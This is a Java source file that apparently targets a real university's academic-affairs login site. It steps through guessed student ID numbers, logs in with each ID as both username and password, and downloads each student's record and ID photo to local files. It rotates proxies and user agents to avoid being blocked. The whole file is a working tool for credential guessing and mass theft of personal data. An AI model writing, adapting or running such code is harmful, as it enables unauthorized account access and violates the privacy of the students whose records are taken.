import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;

/**
 * Created by cxyu on 17-7-29.
 */
public class Try_get {
    public static Boolean get_in(String zjh, String mm) {
        Connection con = Jsoup.connect("http://jw.hebust.edu.cn/loginAction.do")
                .timeout(5000)
                .userAgent("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31")
                .cookie("JSESSIONID", "fbh4MZLa-JtIqg40Sa32v");
        //发送参数
        con.data("zjh", zjh);
        con.data("mm", mm);


        try {
            Document doc = con.post(); //将获取到的内容打印出来
            //System.out.println(doc);
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    public static String get_xjxx(String banji){
        try{
            String name="";
            Document document=Jsoup.connect("http://jw.hebust.edu.cn/xjInfoAction.do?oper=xjxx")
                    .timeout(5000)
                    .userAgent("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31")
                    .cookie("JSESSIONID", "fbh4MZLa-JtIqg40Sa32v")
                    .get();
            name =document.select("#tblView > tbody > tr:nth-child(1) > td:nth-child(4)").text();
            System.out.println("name"+name);
            String all="";
            Elements trs=document.select("#tblView > tbody > tr");
            for(Element tr:trs){
                Elements td=tr.select("td");
                for(int i=0;i<td.size();i++){
                    all=all+td.get(i).text();
                    if(i>0&&(i+1)%2==0)
                        all=all+"\n";
                }
            }
            //System.out.println(all);
            if(name.length()>1)
            appendMethodB("/home/cxyu/za/school/"+banji+"-"+name,all);
            return name;
        }
        catch (Exception e){
            e.printStackTrace();
            return "error";
        }
    }

    public static Boolean get_page(String banji,String name) {
        try {
            Connection.Response resultImageResponse = Jsoup.connect("http://jw.hebust.edu.cn/xjInfoAction.do?oper=img")
                    .timeout(10000)
                    .cookie("JSESSIONID", "fbh4MZLa-JtIqg40Sa32v")
                    .ignoreContentType(true).execute();

            // output here
            FileOutputStream out = (new FileOutputStream(new java.io.File("/home/cxyu/za/school/"+ banji+"-"+ name+".jpg")));
            out.write(resultImageResponse.bodyAsBytes());
            // resultImageResponse.body() is where the image's contents are.
            out.close();
            return true;

        } catch (IOException e) {
            e.printStackTrace();
            return false;
        }
    }

    public static Boolean get_out(){
        Connection con1 = Jsoup.connect("http://jw.hebust.edu.cn/logout.do")
                .timeout(5000)
                .userAgent("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31")
                .cookie("JSESSIONID", "fbh4MZLa-JtIqg40Sa32v");
        con1.data("loginType", "platformLogin");
        try {
            Document document = con1.post();
            return true;
        } catch (IOException e) {
            e.printStackTrace();
            return false;
        }
    }

    public static void appendMethodB(String fileName, String content) {
        try {
            //打开一个写文件器，构造函数中的第二个参数true表示以追加形式写文件
            FileWriter writer = new FileWriter(fileName);
            writer.write(content);
            writer.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }



    public static void get_one(String Class,String id){
        Boolean one= false;
        String ip_port = "";
        try {
            while (true) {
                ip_port = Cheak_ip.get_cheakip();
                if (ip_port == null)
                    continue;
                else
                    break;
            }
            String ip = "";
            String port = "";
            ip = ip_port.split(":")[0];
            port = ip_port.split(":")[1];
            System.getProperties().setProperty("http.proxyHost", ip);
            System.getProperties().setProperty("http.proxyPort", port);
            try{
                String name2="";
                one=get_in(Class+id,Class+id);
                if(one){
                name2=get_xjxx(Class);
                if(name2!=null&&one&&!name2.equals("error"))
                    if(name2.length()>1)
                        one=get_page(Class,name2);
                if(name2.equals("error"))
                    one=false;
                if(one)
                one=get_out();}
                //失败再来一遍
                if(one==false)
                get_one(Class,id);
                if(Cheak_ip.cheak_ip(ip_port))

                    Cheak_ip.ip_cheak.add(ip_port);
                else
                    get_one(Class,id);
            }
            catch (Exception e){
                e.printStackTrace();
            }




        }catch (Exception e){
            e.printStackTrace();
        }
    }

    //输入为例子：1307061后面的36不输入
    //每次先创建一个文件夹
    //也不知道是哪个学院的，直接以7061为文件名
    //先尝试获取院级的信息
    public static void get_class(String Class){
//        try {
//            File s=new File("/home/cxyu/za/school/"+Class);
//            s.mkdirs();
//        }
//        catch (Exception e){
//            e.printStackTrace();
//        }
        for(int i=0;i<50;i++){
            try{
                get_one(Class,""+i);
            }
            catch (Exception e){
                e.printStackTrace();
            }
        }
    }

    public static void start_config(){
        rmb.useragent.add(" Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36");
        rmb.useragent.add("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50");
        rmb.useragent.add("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50");
        rmb.useragent.add("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)");
        rmb.useragent.add("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)");
        rmb.useragent.add("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv,2.0.1) Gecko/20100101 Firefox/4.0.1");
        rmb.useragent.add("Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; en) Presto/2.8.131 Version/11.11");
        rmb.useragent.add("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; TencentTraveler 4.0)");
        rmb rmb = new rmb();
        for (int i = 0; i < 1; i++) {
            Thread one = new Thread(rmb);
            one.start();
        }

        Cheak_ip cheak_ip = new Cheak_ip();
        for (int i = 0; i < 10; i++) {
            Thread one = new Thread(cheak_ip);
            one.start();
        }
    }

    public static void main(String args[]) {
        start_config();

        //130不知道0的概念是什么
        //706从701到715试试，不知道0代表什么，先设定7为学院
        //136，其中1为班级，36为学号，班级顶多只有5个，学号顶多到50
        get_class("1307061");


        //先只试13级的。






    }
}
